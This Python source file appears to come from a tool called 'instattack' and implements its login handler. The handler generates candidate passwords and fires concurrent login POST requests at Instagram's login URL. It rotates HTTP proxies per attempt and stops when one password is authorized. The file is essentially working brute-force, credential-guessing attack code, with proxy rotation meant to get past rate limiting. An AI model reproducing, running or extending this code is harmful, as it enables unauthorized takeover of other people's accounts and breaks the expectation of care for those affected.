from __future__ import absolute_import

import asyncio
import aiohttp
import collections

from instattack import settings
from instattack.exceptions import ClientResponseError
from instattack.lib import starting, starting_context
from instattack.utils import limit_on_success, limit_as_completed

from .models import LoginAttemptContext, LoginContext
from .exceptions import NoPasswordsError
from .base import PostRequestHandler


class LoginHandler(PostRequestHandler):

    __name__ = 'Login Handler'

    def __init__(self, config, proxy_handler, **kwargs):
        super(LoginHandler, self).__init__(config, proxy_handler, **kwargs)

        self.limit = config['login']['pwlimit']
        self.batch_size = config['login']['batch_size']
        self.attempt_batch_size = config['login']['attempt_batch_size']

        self.results = asyncio.Queue()
        self.attempts = asyncio.Queue()
        self.passwords = asyncio.Queue()

        # Index for the current password and attempts per password.
        self.login_index = 0
        self.num_completed = 0

        self.login_index = 0  # Indexed
        self.attempts_count = collections.Counter()  # Indexed by Password
        self.proxies_count = collections.Counter()  # Indexed by Proxy Unique ID

        self._all_tasks = []

    async def run(self, loop, token, cookies):

        await self.prepopulate(loop)

        with starting_context(self):
            # Make sure we are just returning the results from the login attempts
            # method, or possibly the results consumption, depending.
            return await self.attempt_login(loop, token, cookies)

    @starting('Password Prepopulation')
    async def prepopulate(self, loop):
        futures = []
        async for password in self.user.generate_attempts(loop, limit=self.limit):
            futures.append(self.passwords.put(password))

        results = await asyncio.gather(*futures)
        for res in results:
            try:
                res.result()
            except Exception as e:
                self.log.traceback(e)
                raise e

        if len(futures) == 0:
            raise NoPasswordsError()

        self.log.complete(f"Prepopulated {len(futures)} Password Attempts")

    async def login_task_generator(self, loop, session):
        """
        Generates coroutines for each password to be attempted and yields
        them in the generator.

        We don't have to worry about a stop event if the authenticated result
        is found since this will generate relatively quickly and the coroutines
        have not been run yet.
        """
        while True:
            password = await self.passwords.get()
            if password:
                self.log.info('Created Task for Password %s' % password)

                context = LoginContext(
                    index=self.login_index,
                    password=password
                )
                self.login_index += 1
                yield self.login_with_password(loop, session, context)

    async def login_attempt_task_generator(self, loop, session, context):
        """
        Generates coroutines for each password to be attempted and yields
        them in the generator.

        We don't have to worry about a stop event if the authenticated result
        is found since this will generate relatively quickly and the coroutines
        have not been run yet.
        """
        while True:
            proxy = await self.proxy_handler.pool.get()
            if proxy:
                if proxy.unique_id in self.proxies_count:
                    self.log.warning(
                        f'Already Used Proxy {self.proxies_count[proxy.unique_id]} Times.',
                        extra={'proxy': proxy}
                    )

                new_context = LoginAttemptContext(
                    index=self.attempts_count[context.password],
                    parent_index=context.index,
                    password=context.password,
                    proxy=proxy,
                )

                self.proxies_count[proxy.unique_id] += 1
                self.attempts_count[context.password] += 1
                yield self.login_request(loop, session, new_context)

    @starting('Login Requests')
    async def attempt_login(self, loop):
        """
        TODO:
        ----
        We might want to set a max_tries parameter on the limit_as_completed call
        so we don't wind up making the same request hundreds of times if we run
        into issues.
        """
        self.log.debug('Waiting on Start Event...')
        await self.start_event.wait()

        self.log.start('Starting Session...')

        with starting_context(self, 'Starting Login Requests'):
            cookies = await self.cookies()
            async with aiohttp.ClientSession(
                connector=self._connector,
                cookies=cookies,
                timeout=self._timeout,
            ) as session:
                async for result in limit_as_completed(
                        self.login_task_generator(loop, session), self.batch_size):

                    res = await result
                    self.log.info(res.__dict__)
                    if not res or not res.conclusive:
                        raise RuntimeError("Result should be valid and conclusive.")

                    self.num_completed += 1
                    self.log.info("{0:.2%}".format(
                        float(self.num_completed) / self.passwords.qsize()))
                    await self.results.put(res)

                    if res.authorized:
                        self.log.debug('Authorized Result: Setting Stop Event')
                        self.stop_event.set()
                        break

                    self.log.error("Not Authenticated", extra={'password': res.context.password})
                    await self.attempts.put(res.context.password)

            self.log.complete('Closing Session')
            await asyncio.sleep(0)

        # TODO: Cleanup Tasks

    async def attempt_single_login(self, loop, password):
        await self.passwords.put(password)
        return await self.attempt_login(loop)

        # await self.start_event.wait()

        # with starting_context(self, 'Single Login Request'):
        #     cookies = await self.cookies()
        #     async with aiohttp.ClientSession(
        #         connector=self._connector,
        #         cookies=cookies,
        #         timeout=self._timeout,
        #     ) as session:

        #         context = LoginContext(
        #             index=self.login_index,
        #             password=password
        #         )
        #         self.login_index += 1

        #         result = await self.login_with_password(loop, session, context)
        #         self.log.complete(result)

        # self.log.info('Closing Session')
        # await asyncio.sleep(0)

        # # If we return the result right away, the handler will be stopped and
        # # leftover tasks will be cancelled.  We have to make sure to save the
        # # proxies before doing that.
        # leftover = [tsk for tsk in self._all_tasks if not tsk.done()]
        # self.log.info(f'Cleaning Up {len(leftover)} Proxy Saves...')
        # save_results = await asyncio.gather(*self._all_tasks, return_exceptions=True)

        # leftover = [tsk for tsk in self._all_tasks if not tsk.done()]
        # self.log.info(f'Done Cleaning Up {len(leftover)} Proxy Saves...')

        # for i, res in enumerate(save_results):
        #     self.log.info('Checking Save Result %s' % i)
        #     if isinstance(res, Exception):
        #         self.log.critical('Found exception')

        # leftover = [tsk for tsk in self._all_tasks if not tsk.done()]
        # self.log.info(f'Now {len(leftover)} Tasks.')
        # return result

    async def login_with_password(self, loop, session, context):
        """
        Makes concurrent fetches for a single password and limits the number of
        current fetches to the batch_size.  Will return when it finds the first
        request that returns a valid result.

        TODO:
        ----
        We might want to set a max_tries parameter on the limit_on_success call
        so we don't wind up making the same request hundreds of times if we run
        into issues.
        """

        # Wait for start event to signal that we are ready to start making
        # requests with the proxies.
        await self.start_event.wait()

        return await limit_on_success(
            self.login_attempt_task_generator(loop, session, context),
            self.attempt_batch_size
        )

    async def login_request(self, loop, session, context):
        """
        TODO
        ----
        We might want to incorporate handling of a "Too Many Requests" exception
        that is smarter and will notify the handler to use a different proxy and
        note the time.
        """
        try:
            if not self.headers:
                raise RuntimeError('Headers should be set.')

            self.log.info('Submitting Request %s' % self.attempts_count[context.password])
            async with session.post(
                settings.INSTAGRAM_LOGIN_URL,
                headers=self.headers,
                data=self._login_data(context.password),
                ssl=False,
                proxy=context.proxy.url  # Only Http Proxies Are Supported by AioHTTP
            ) as response:
                self.log.debug('Got Result for Attempt %s' % context.index)
                try:
                    result = await self.handle_client_response(response)
                except ClientResponseError as e:
                    self.log.error(e, extra={
                        'response': response,
                        'context': context
                    })
                    # Not sure if we want to note this as an error or not, it might
                    # be better to note as inconclusive.
                    task = asyncio.create_task(self.proxy_error(context.proxy, e))
                    self._all_tasks.append(task)
                else:
                    if not result:
                        raise RuntimeError("Result should not be None here.")
                    self.log.info(result.__dict__)
                    # if result.authorized:
                    task = asyncio.create_task(self.proxy_success(context.proxy))
                    self._all_tasks.append(task)
                    return result

        except ClientResponseError as e:
            self.log.error(e, extra={
                'response': response,
                'context': context
            })
            # Not sure if we want to note this as an error or not, it might
            # be better to note as inconclusive.
            task = asyncio.create_task(self.proxy_error(context.proxy, e))
            self._all_tasks.append(task)

        except Exception as e:
            task = await self.handle_request_error(e, context.proxy, context)
            if task:
                self._all_tasks.append(task)

    async def save(self, loop):
        self.log.info('Dumping Password Attempts')
        self.log.critical('Have to make sure were not saving a successful password.')
        return await self.user.write_attempts(self.attempts)
